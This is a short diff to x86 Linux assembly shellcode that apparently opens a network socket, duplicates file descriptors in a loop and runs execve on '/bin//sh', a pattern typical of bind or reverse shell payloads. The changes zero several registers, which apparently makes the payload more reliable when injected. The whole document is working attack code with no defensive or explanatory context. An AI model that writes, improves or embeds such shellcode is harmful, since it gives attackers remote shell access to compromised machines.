@@ -6,6 +6,7 @@ _start:
 
 ; SYS_SOCKET 1
    xor eax, eax
+   xor ebx, ebx
    push eax
    mov bl, 1
    push ebx
@@ -67,8 +68,10 @@ duploop:
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp     ; get ptr to /bin//sh
-   push eax         ; optional
-   push ebx         ; optional
+   push eax         ; 
+   push ebx         ; 
+   xor edx, edx     ; clean up registers used earlier
+   xor esi, esi     ; clean registers
    mov ecx, esp     ; if both removed, then need to xor this
    mov al, 0xb
    int 0x80 
